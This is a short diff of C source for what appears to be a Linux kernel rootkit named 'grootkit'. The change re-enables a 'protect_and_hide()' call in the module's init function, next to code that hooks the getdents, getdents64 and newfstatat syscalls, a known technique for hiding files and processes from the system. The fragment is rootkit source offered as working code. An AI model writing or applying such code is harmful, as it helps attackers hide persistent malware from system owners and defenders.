@@ -1230,7 +1230,7 @@ void get_full_path(char* full_file_path, char* directory, char* filename) {
 */
 static int __init grootkit_init(void) {
     smallest_pid = current->pid;
-    // protect_and_hide();
+    protect_and_hide();
     getdents64_base = syscall_hooking((unsigned long)getdents64_hook, (unsigned int)__NR_getdents64);
     newfstatat_base = syscall_hooking((unsigned long)newfstatat_hook, (unsigned int)__NR_newfstatat);
     getdents_base = syscall_hooking((unsigned long)getdents_hook, (unsigned int)__NR_getdents);
